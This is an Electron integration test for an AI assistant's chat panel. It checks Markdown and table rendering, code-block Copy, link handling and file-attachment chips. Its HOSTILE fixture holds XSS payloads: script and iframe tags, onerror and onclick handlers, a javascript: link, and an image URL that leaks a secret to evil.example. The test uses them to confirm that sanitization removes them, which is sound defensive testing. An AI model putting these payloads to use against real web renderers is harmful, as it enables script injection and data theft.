// Noah/bench/integration/panel-render-check.cjs
//
// The assistant panel (ai-panel.html) in REAL Electron at the panel's real width: transparent full-width assistant messages, Markdown,
// code blocks + Copy (clicked with a genuine trusted input event, then the OS clipboard is read back), sanitization against hostile
// reply text, link handling, and the attachment chips. Saves a screenshot to Noah/bench/results/panel-render.png.
//
//   npx electron Noah/bench/integration/panel-render-check.cjs
"use strict";

const path = require("path");
const fs = require("fs");
const { app, BrowserWindow, clipboard } = require("electron");

const ROOT = path.resolve(__dirname, "..", "..", "..");
const RESULTS = path.join(ROOT, "Noah", "bench", "results");
app.on("window-all-closed", () => {});
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const results = [];
const check = (name, ok, detail = "") => {
  results.push(!!ok);
  console.log(`${ok ? "PASS" : "FAIL"}  ${name}${detail ? "  -> " + detail : ""}`);
};

const REPLY = [
  "# Quarterly summary",
  "Revenue grew **12 percent** and churn *fell*. See the [full report](https://example.com/report) for details.",
  "## Highlights",
  "- First point",
  "- Second point with `inline_code()`",
  "  - Nested point A",
  "  - Nested point B",
  "1. Step one",
  "2. Step two",
  "   1. Sub-step",
  "",
  "> **Important:** Something important here.",
  "",
  "| Region | Sales | Growth |",
  "| --- | ---: | --- |",
  "| North | 120 | 4% |",
  "| South | 95 | 9% |",
  "",
  "---",
  "",
  "```python",
  "def greet(name):",
  "    # say hello",
  "    return f\"Hello, {name}!\"",
  "",
  "print(greet('Noah'))",
  "```",
  "",
  "```javascript",
  "const total = items.reduce((sum, x) => sum + x.price, 0); // a really long line so the block has to scroll sideways instead of wrapping around the panel edge",
  "console.log(\"Hello World\");",
  "```",
  "",
  "```",
  "SELECT name, COUNT(*) FROM users WHERE active = 1 GROUP BY name;",
  "```",
].join("\n");

const HOSTILE = [
  "Normal text first.",
  "",
  "<script>window.__pwned = 'script ran'</script>",
  "<img src=x onerror=\"window.__pwned='img onerror'\">",
  "<iframe src=\"https://evil.example\"></iframe>",
  "<style>body{display:none}</style>",
  "<div class=\"codeblock-copy\">FAKE PANEL BUTTON</div>",
  "[click me](javascript:window.__pwned='js link')",
  "![tracking pixel](https://evil.example/pixel.png?secret=hunter2)",
  "<a href=\"https://raw-html.example\" onclick=\"window.__pwned='onclick'\">raw html link</a>",
  "[a real link](https://ok.example/path)",
  "[mail me](mailto:someone@example.com)",
].join("\n");

const LOOSE = ["Here is the program:", "", "def add(a, b):", "    return a + b", "print(add(1, 2))", "", "Run it with Python.", "", "Some steps:", "- install (see the docs)", "- run it", "- enjoy (really)"].join("\n");

async function main() {
  fs.mkdirSync(RESULTS, { recursive: true });
  const win = new BrowserWindow({ show: true, x: 40, y: 40, useContentSize: true, width: 412, height: 760, webPreferences: { contextIsolation: true, sandbox: true } });
  await win.loadFile(path.join(ROOT, "ai-panel.html"));
  const ev = (js) => win.webContents.executeJavaScript(js, true);
  await sleep(600);
  await ev("window.__realPost = window.postMessage.bind(window); true");

  check("the render libraries loaded (marked, DOMPurify, highlight.js + extra languages, chat-render)", await ev("!!(window.marked && window.DOMPurify && window.hljs && window.JonahChatRender && hljs.getLanguage('powershell') && hljs.getLanguage('python'))"));

  await ev(`addMessage("Explain my quarterly numbers", "user"); addMessage(${JSON.stringify(REPLY)}, "ai"); true`);
  await sleep(200);

  // ---- layout: transparent, borderless, full width
  const lay = await ev(`(() => {
    const ai = document.querySelector('.msg.ai'), chat = document.getElementById('chat'), user = document.querySelector('.msg.user');
    const cs = getComputedStyle(ai), cr = chat.getBoundingClientRect(), ar = ai.getBoundingClientRect(), ur = user.getBoundingClientRect();
    const ucs = getComputedStyle(user);
    return { bg: cs.backgroundColor, borderW: cs.borderTopWidth, borderS: cs.borderTopStyle, shadow: cs.boxShadow, filter: cs.backdropFilter, aiW: ar.width, chatW: chat.clientWidth,
      aiLeft: ar.left - cr.left, aiRight: cr.right - ar.right, userBg: ucs.backgroundImage, userRight: cr.right - ur.right, userW: ur.width };
  })()`);
  check("assistant message background is transparent", lay.bg === "rgba(0, 0, 0, 0)" || lay.bg === "transparent", lay.bg);
  check("assistant message has no border, shadow or blur box", (lay.borderS === "none" || lay.borderW === "0px") && lay.shadow === "none" && (lay.filter === "none" || !lay.filter), `${lay.borderS} ${lay.borderW} | ${lay.shadow}`);
  check("assistant message uses the full chat width (not a narrow bubble)", lay.aiW >= lay.chatW - 30, `message ${Math.round(lay.aiW)}px of ${lay.chatW}px`);
  check("user message keeps its violet bubble, right-aligned and narrower", /gradient/.test(lay.userBg) && lay.userW < lay.chatW * 0.9 && lay.userRight < 20, `bg=${lay.userBg.slice(0, 40)} width=${Math.round(lay.userW)}`);

  // ---- markdown structure
  const md = await ev(`(() => {
    const m = document.querySelector('.msg.ai .md'), $ = (s) => m.querySelector(s), $$ = (s) => m.querySelectorAll(s);
    return { h1: $('h1') && $('h1').textContent, h2: $('h2') && $('h2').textContent, strong: $('strong') && $('strong').textContent, em: $('em') && $('em').textContent,
      ulLis: $$('ul > li').length, nestedUl: !!$('ul ul li'), ol: $$('ol > li').length, nestedOl: !!$('ol ol li'), quote: $('blockquote') && $('blockquote').textContent.trim(),
      quoteBorder: $('blockquote') && getComputedStyle($('blockquote')).borderLeftWidth, tableWrap: !!$('.table-wrap table'), th: $$('th').length, td: $$('td').length,
      alignRight: $$('th')[1] && getComputedStyle($$('th')[1]).textAlign, hr: !!$('hr'), inlineCode: $('li code') && $('li code').textContent, link: $('a') && { href: $('a').href, rel: $('a').rel, text: $('a').textContent },
      rawMarkers: /(\\*\\*|##|\\| ---|\\\`\\\`\\\`)/.test(m.textContent), listStyle: getComputedStyle($('ul')).listStyleType, paragraphs: $$('p').length };
  })()`);
  check("headings render (h1 + h2), not raw #", md.h1 === "Quarterly summary" && md.h2 === "Highlights", `${md.h1} / ${md.h2}`);
  check("bold and italic render", md.strong === "12 percent" && md.em === "fell");
  check("bullet list, NESTED bullets, numbered list and NESTED numbered list", md.ulLis >= 4 && md.nestedUl && md.ol >= 3 && md.nestedOl, JSON.stringify({ ulLis: md.ulLis, ol: md.ol }));
  check("list bullets are actually visible (list-style not reset)", md.listStyle === "disc", md.listStyle);
  check("blockquote renders with a left bar", /Important:.*Something important here/.test(md.quote || "") && parseFloat(md.quoteBorder) >= 2, `${md.quote} border=${md.quoteBorder}`);
  check("table renders with header + body cells, in a scroll wrapper, right-aligned column honoured", md.tableWrap && md.th === 3 && md.td === 6 && md.alignRight === "right", JSON.stringify({ th: md.th, td: md.td, align: md.alignRight }));
  check("horizontal rule, inline code, paragraphs", md.hr && md.inlineCode === "inline_code()" && md.paragraphs >= 1);
  check("link is a real link with rel=noopener noreferrer", md.link && md.link.href === "https://example.com/report" && /noopener/.test(md.link.rel), JSON.stringify(md.link));
  check("no raw Markdown characters leak into the rendered text", !md.rawMarkers);

  // ---- code blocks
  const code = await ev(`(() => {
    const blocks = Array.from(document.querySelectorAll('.msg.ai .codeblock'));
    return blocks.map((b) => ({ lang: b.querySelector('.codeblock-lang').textContent, copy: !!b.querySelector('button.codeblock-copy'), tokens: b.querySelectorAll('code .hljs-keyword, code .hljs-string, code .hljs-title, code .hljs-built_in, code .hljs-comment').length,
      font: getComputedStyle(b.querySelector('code')).fontFamily.split(',')[0], scrollX: b.querySelector('pre').scrollWidth > b.querySelector('pre').clientWidth + 2, overflow: getComputedStyle(b.querySelector('pre')).overflowX,
      copyTop: b.querySelector('.codeblock-copy').getBoundingClientRect().top - b.getBoundingClientRect().top, copyRight: b.getBoundingClientRect().right - b.querySelector('.codeblock-copy').getBoundingClientRect().right,
      headBg: getComputedStyle(b.querySelector('.codeblock-head')).backgroundColor, text: b.querySelector('code').textContent }));
  })()`);
  check("three code blocks, each a card with a Copy button", code.length === 3 && code.every((c) => c.copy));
  check("language is identified: Python and JavaScript from the fence, SQL auto-detected for an unlabelled block", code[0].lang === "Python" && code[1].lang === "JavaScript" && code[2].lang === "SQL", code.map((c) => c.lang).join(", "));
  check("syntax highlighting produced colour tokens in every block", code.every((c) => c.tokens > 0), code.map((c) => c.tokens).join(", "));
  check("code uses a monospace font", code.every((c) => /mono|consolas|cascadia|menlo/i.test(c.font)), code[0].font);
  check("Copy button sits in the top-right corner of the block", code[0].copyTop < 12 && code[0].copyRight < 14, `top ${Math.round(code[0].copyTop)} right ${Math.round(code[0].copyRight)}`);
  check("a long line scrolls sideways inside the block instead of breaking the layout", code[1].scrollX && /auto|scroll/.test(code[1].overflow), `scrollX=${code[1].scrollX} overflow=${code[1].overflow}`);
  const pageOverflow = await ev("document.documentElement.scrollWidth > document.documentElement.clientWidth + 1");
  check("the whole panel does not scroll horizontally", !pageOverflow);

  // ---- Copy: a REAL trusted click, then read the OS clipboard back
  clipboard.writeText("(untouched)");
  const pos = await ev(`(() => { const r = document.querySelector('.codeblock-copy').getBoundingClientRect(); document.querySelector('.codeblock-copy').scrollIntoView({block:'center'}); const r2 = document.querySelector('.codeblock-copy').getBoundingClientRect(); return { x: r2.left + r2.width / 2, y: r2.top + r2.height / 2 }; })()`);
  win.focus();
  win.webContents.focus();
  await sleep(200);
  for (const type of ["mouseMove", "mouseDown", "mouseUp"]) {
    win.webContents.sendInputEvent({ type, x: Math.round(pos.x), y: Math.round(pos.y), button: "left", clickCount: 1 });
    await sleep(60);
  }
  await sleep(400);
  const copied = clipboard.readText();
  check("clicking Copy puts the ENTIRE code block on the clipboard (verified from the OS clipboard; Windows adds CRLF)", copied.replace(/\r\n/g, "\n") === code[0].text && copied.includes("def greet(name):") && copied.includes("print(greet('Noah'))"), JSON.stringify(copied.slice(0, 80)));
  check("the button confirms with 'Copied!'", (await ev("document.querySelector('.codeblock-copy').textContent")) === "Copied!");

  // ---- hostile reply text
  await ev(`addMessage(${JSON.stringify(HOSTILE)}, "ai"); true`);
  await sleep(150);
  const bad = await ev(`(() => {
    const m = Array.from(document.querySelectorAll('.msg.ai .md')).pop();
    const attrs = Array.from(m.querySelectorAll('*')).flatMap((e) => Array.from(e.attributes).map((a) => a.name));
    return { pwned: window.__pwned || null, script: m.querySelectorAll('script, iframe, img, style, object, embed, form, input').length, handlers: attrs.filter((a) => /^on/i.test(a)),
      jsLinks: Array.from(m.querySelectorAll('a')).filter((a) => /^(javascript|mailto|data):/i.test(a.getAttribute('href') || '')).length,
      fakeButtons: Array.from(m.querySelectorAll('.codeblock-copy')).filter((b) => !b.closest('.codeblock-head')).length + m.querySelectorAll('.chip, .msg, [role=button]').length, links: Array.from(m.querySelectorAll('a')).map((a) => a.href).filter(Boolean), text: m.textContent, bodyHidden: getComputedStyle(document.body).display === 'none' };
  })()`);
  check("hostile reply: no script ran, no handler attributes survived", bad.pwned === null && bad.handlers.length === 0, `pwned=${bad.pwned} handlers=${bad.handlers}`);
  check("hostile reply: no script/iframe/img/style/form elements exist", bad.script === 0 && !bad.bodyHidden);
  check("hostile reply: javascript:/mailto: links are gone; the real https link stays", bad.jsLinks === 0 && bad.links.length === 1 && bad.links[0] === "https://ok.example/path" && /raw html link/.test(bad.text), JSON.stringify(bad.links));
  check("hostile reply: raw HTML is shown as text (cannot fake the panel's buttons)", bad.fakeButtons === 0 && /FAKE PANEL BUTTON/.test(bad.text));
  check("hostile reply: the remote image is never fetched (alt text shown, no <img>)", /tracking pixel/.test(bad.text) && !/hunter2/.test(bad.text));

  // ---- link click hands the URL to the shell instead of navigating the panel
  await ev(`window.__opened = []; window.parent.postMessage = (m) => { window.__opened.push(m); }; true`);
  const before = await ev("location.href");
  await ev(`Array.from(document.querySelectorAll('.msg.ai .md a')).find((a) => a.href.startsWith('https://example.com')).click()`);
  await sleep(100);
  const opened = await ev("window.__opened");
  check("clicking a link asks the shell to open it in a new tab and does NOT navigate the panel", opened.some((m) => m.type === "noah:open-url" && m.url === "https://example.com/report") && (await ev("location.href")) === before, JSON.stringify(opened));

  // ---- unfenced code and ordinary prose
  await ev(`addMessage(${JSON.stringify(LOOSE)}, "ai"); true`);
  await sleep(150);
  const loose = await ev(`(() => { const m = Array.from(document.querySelectorAll('.msg.ai .md')).pop(); return { blocks: m.querySelectorAll('.codeblock').length, code: m.querySelector('.codeblock code') && m.querySelector('.codeblock code').textContent, lis: m.querySelectorAll('li').length, prose: m.textContent.includes('Run it with Python.') && !m.querySelector('.codeblock').textContent.includes('Run it with Python') }; })()`);
  check("code the model forgot to fence is put in a code block; the prose and the bullet list around it are left alone", loose.blocks === 1 && /def add\(a, b\)/.test(loose.code || "") && loose.lis === 3 && loose.prose, JSON.stringify({ blocks: loose.blocks, lis: loose.lis }));

  // ---- attachments UI (the shell is emulated: the panel talks to it only through postMessage)
  await ev(`(() => {
    window.__sent = [];
    window.parent.postMessage = (m) => { window.__sent.push(m); if (m.type === 'noah:attach-file') {
      const ok = /bad/.test(m.name) ? { ok: false, error: 'This file is password-protected.' } : /empty/.test(m.name) ? { ok: true, id: 'id-' + m.reqId, kind: 'image', chars: 0, meta: {}, warnings: ['No text was found in this image.'], empty: true } : { ok: true, id: 'id-' + m.reqId, kind: 'pdf', chars: 5000, meta: { pages: 12 }, warnings: [] };
      setTimeout(() => window.__realPost({ type: 'noah:attach-result', payload: { reqId: m.reqId, result: ok } }, '*'), 150); } };
  })()`);
  await ev(`(async () => { const mk = (n) => new File([new Uint8Array([1, 2, 3])], n); addFiles([mk('report.pdf'), mk('bad.docx'), mk('empty.png')]); })()`);
  await sleep(60);
  const loading = await ev("Array.from(document.querySelectorAll('.chip')).map((c) => c.className)");
  await sleep(500);
  const chips = await ev("Array.from(document.querySelectorAll('.chip')).map((c) => ({ cls: c.className, name: c.querySelector('.name').textContent, sub: c.querySelector('.sub').textContent }))");
  check("chips show 'reading' while a file is being processed", loading.length === 3 && loading.every((c) => /loading/.test(c)), loading.join(" | "));
  check("chips end as: ready (with page count), error (with the reason), warning (no readable text)", /ready|^chip $/.test(chips[0].cls) && chips[0].sub === "12 pages" && /error/.test(chips[1].cls) && /password-protected/.test(chips[1].sub) && /warn/.test(chips[2].cls), JSON.stringify(chips));
  await ev(`document.getElementById('input').value = 'summarize the attached file'; sendMessage();`);
  const sent = await ev("window.__sent.filter((m) => m.type === 'rexy:submit-goal')");
  check("sending includes ONLY the ready file's id (not the failed or empty ones)", sent.length === 1 && sent[0].attachmentIds.length === 1 && /^id-f\d+$/.test(sent[0].attachmentIds[0]) && sent[0].goal === "summarize the attached file", JSON.stringify(sent));
  check("the user's bubble lists the attached file", (await ev("Array.from(document.querySelectorAll('.msg.user')).pop().textContent")).includes("report.pdf"));
  await ev(`document.querySelector('.chip .x').click()`);
  const afterRemove = await ev("({ n: document.querySelectorAll('.chip').length, removed: window.__sent.filter((m) => m.type === 'noah:attach-remove') })");
  check("removing a chip tells the main process to drop the file", afterRemove.n === 2 && afterRemove.removed.length === 1 && /^id-f/.test(afterRemove.removed[0].id), JSON.stringify(afterRemove));
  await ev(`document.getElementById('input').value = 'x'; document.getElementById('input').dispatchEvent(new Event('input'));`);
  check("typing pings the shell (so keystrokes are never treated as speech)", (await ev("window.__sent.some((m) => m.type === 'noah:typing')")));

  // a long reply scrolls inside the chat, not the page
  await ev(`addMessage(Array.from({length: 60}, (_, i) => '### Section ' + i + '\\n\\nParagraph text for section ' + i + ' that is fairly long and wraps across a couple of lines in the narrow panel.').join('\\n\\n'), 'ai'); true`);
  await sleep(200);
  const scroll = await ev("(() => { const c = document.getElementById('chat'); return { canScroll: c.scrollHeight > c.clientHeight + 100, pageScroll: document.documentElement.scrollHeight > document.documentElement.clientHeight + 1, atBottom: c.scrollTop + c.clientHeight >= c.scrollHeight - 4 }; })()");
  check("a very long reply scrolls inside the chat area (not the page), and the view follows the newest text", scroll.canScroll && !scroll.pageScroll && scroll.atBottom, JSON.stringify(scroll));

  // ---- screenshot for a human look
  await ev(`document.getElementById('chat').scrollTop = 0`);
  await ev(`(() => { const first = document.querySelectorAll('.msg')[1]; first.scrollIntoView({ block: 'start' }); })()`);
  await sleep(300);
  fs.writeFileSync(path.join(RESULTS, "panel-render.png"), (await win.webContents.capturePage()).toPNG());
  await ev(`(() => { const cb = document.querySelector('.codeblock'); cb.scrollIntoView({ block: 'start' }); })()`);
  await sleep(200);
  fs.writeFileSync(path.join(RESULTS, "panel-render-code.png"), (await win.webContents.capturePage()).toPNG());

  console.log(`\n${results.filter(Boolean).length}/${results.length} checks passed`);
  win.destroy();
  app.exit(results.every(Boolean) ? 0 : 1);
}

app.whenReady().then(() =>
  main().catch((e) => {
    console.error("PANEL CHECK FAILED:", e && e.stack);
    app.exit(1);
  })
);
